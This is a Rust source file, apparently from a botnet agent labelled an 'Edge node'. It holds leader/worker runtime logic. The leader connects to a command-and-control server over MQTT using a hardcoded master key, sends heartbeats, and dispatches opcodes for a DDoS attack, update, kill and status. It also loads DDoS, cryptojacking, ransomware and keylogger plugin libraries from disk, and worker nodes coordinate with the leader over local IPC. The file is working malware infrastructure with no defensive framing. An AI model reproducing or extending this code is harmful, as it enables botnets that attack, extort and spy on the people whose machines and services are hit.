//! # Runtime Modes
//!
//! Leader and Worker runtime logic for the Edge node.

use std::sync::Arc;
use std::time::Duration;
use log::{info, warn, error, debug};
use tokio::time::sleep;
use tokio::sync::mpsc;
use rand::Rng;

use crate::network::client::PolyMqttClient;
use crate::network::bootstrap::ProfessionalBootstrapper;
use crate::network::bridge::BridgeService;
use crate::network::local_comm::{LocalTransport, LipcMsgType};
use crate::network::watchdog::{NetworkWatchdog, run_fallback_monitor};
use crate::discovery::election::ElectionService;
use crate::plugins::manager::PluginManager;

/// Run in Leader mode - handles C2 communication and worker coordination
pub async fn run_leader_mode(election: Arc<ElectionService>) {
    info!("role: leader");

    let watchdog = Arc::new(NetworkWatchdog::new());
    
    // Start fallback monitor
    let wd_clone = watchdog.clone();
    tokio::spawn(async move {
        run_fallback_monitor(wd_clone).await;
    });

    // Monitor election requests
    let elec_clone = election.clone();
    tokio::spawn(async move {
        elec_clone.monitor_requests().await;
    });

    let master_key = [0x42; 32];
    let bootstrapper = ProfessionalBootstrapper::new();

    let swarm_nodes = match bootstrapper.resolve().await {
        Some(nodes) => {
            info!("bootstrap: {} nodes", nodes.len());
            // Save to cache for next run (Tier 0 persistence)
            bootstrapper.save_cache_peers(&nodes);
            nodes
        },
        None => {
            warn!("bootstrap: failed");
            vec![("127.0.0.1".to_string(), 1883)]
        }
    };

    if swarm_nodes.is_empty() {
        error!("bootstrap: no nodes");
        return;
    }

    let (ip, port) = &swarm_nodes[0];
    let client = Arc::new(PolyMqttClient::new(ip, *port, &master_key));
    
    // Channels for Client
    let (msg_tx, msg_rx) = mpsc::channel::<Vec<u8>>(100);
    let (cmd_tx, mut cmd_rx) = mpsc::channel::<Vec<u8>>(100);

    // Start Persistent Cloud Client
    let client_clone = client.clone();
    tokio::spawn(async move {
        client_clone.start_persistent_loop(msg_rx, cmd_tx).await;
    });

    // Start Cloud Heartbeat Loop
    let msg_tx_clone = msg_tx.clone();
    let wd_heartbeat = watchdog.clone();
    tokio::spawn(async move {
        loop {
            let heartbeat = b"HEARTBEAT_LEADER".to_vec();
            if msg_tx_clone.send(heartbeat).await.is_err() {
                error!("[Cloud] Failed to queue heartbeat (Channel Closed)");
                break;
            }
            wd_heartbeat.mark_alive();
            sleep(Duration::from_secs(30)).await;
        }
    });

    // Initialize Plugin Manager
    let mut pm = PluginManager::new();
    
    // Load plugins
    unsafe { load_plugins(&mut pm); }
    
    let pm = Arc::new(tokio::sync::Mutex::new(pm));

    // Handle Incoming Commands
    let pm_cmd = pm.clone();
    let wd_cmd = watchdog.clone();
    let bridge_tx = msg_tx.clone();
    
    tokio::spawn(async move {
        while let Some(cmd) = cmd_rx.recv().await {
            info!("cmd: {} bytes", cmd.len());
            wd_cmd.mark_alive();
            
            if cmd.is_empty() { continue; }
            
            let opcode = cmd[0];
            let payload = if cmd.len() > 1 { &cmd[1..] } else { &[] };
            
            // Try Plugin First
            let handled = {
                let manager = pm_cmd.lock().await;
                manager.handle_command(opcode, payload)
            };

            if handled {
                continue;
            }

            // Fallback to Core Commands
            match opcode {
                0x01 => {
                    // Legacy DDoS handler (if plugin not loaded)
                    info!("cmd: attack (legacy)");
                    let _ = bridge_tx.send(cmd.clone()).await;
                }
                0x02 => {
                    info!("cmd: update");
                    let _ = bridge_tx.send(cmd.clone()).await;
                }
                0x03 => {
                    info!("cmd: kill");
                    std::process::exit(0);
                }
                0x04 => {
                    info!("cmd: status");
                }
                _ => {
                    warn!("cmd: 0x{:02X}", opcode);
                }
            }
        }
    });

    // Setup Bridge (Listen for Workers)
    match LocalTransport::bind_server().await {
        Ok(listener) => {
            let bridge = BridgeService::new(msg_tx.clone());
            let bridge = Arc::new(bridge);
            
            loop {
                match listener.accept().await {
                    Ok((stream, _addr)) => {
                        let b = bridge.clone();
                        tokio::spawn(async move {
                            b.handle_worker(stream).await;
                        });
                    }
                    Err(e) => error!("[Bridge] Accept Error: {}", e),
                }
            }
        }
        Err(e) => error!("[Leader] Failed to bind Local Transport: {}", e),
    }
}

/// Run in Worker mode - connects to Leader via local transport
pub async fn run_worker_mode() {
    info!("[Modes] Entering WORKER Mode. Connecting to Leader.");
    
    let worker_id = rand::thread_rng().gen::<u64>();

    loop {
        match LocalTransport::connect_client().await {
            Ok(mut stream) => {
                info!("[Worker] Connected to Leader. Sending LIPC Hello.");
                
                if let Err(e) = LocalTransport::write_frame(&mut stream, worker_id, LipcMsgType::Hello, &[]).await {
                    error!("[Worker] Failed to send Hello: {}", e);
                    continue;
                }

                loop {
                    let msg = b"HEARTBEAT_WORKER";
                    if let Err(e) = LocalTransport::write_frame(&mut stream, worker_id, LipcMsgType::Data, msg).await {
                        error!("[Worker] Failed to write to Leader: {}", e);
                        break;
                    }
                    debug!("[Worker] Sent LIPC Data");
                    sleep(Duration::from_secs(10)).await;
                }
            }
            Err(e) => {
                warn!("[Worker] Failed to connect to Leader: {}. Retrying in 5s...", e);
                sleep(Duration::from_secs(5)).await;
            }
        }
    }
}

/// Load plugins from disk
unsafe fn load_plugins(pm: &mut PluginManager) {
    let plugins = [
        ("ddos", "libddos"),
        ("cryptojacking", "libcryptojacking"),
        ("ransomware", "libransomware"),
        ("keylogger", "libkeylogger"),
    ];

    for (name, lib_name) in plugins {
        #[cfg(target_os = "macos")]
        let path = format!("../../target/release/{}.dylib", lib_name);
        #[cfg(target_os = "linux")]
        let path = format!("../../target/release/{}.so", lib_name);
        #[cfg(target_os = "windows")]
        let path = format!("../../target/release/{}.dll", lib_name);

        if std::path::Path::new(&path).exists() {
            if let Err(e) = pm.load_plugin(&path) {
                warn!("plugin({}): load failed: {}", name, e);
            }
        }
    }
}
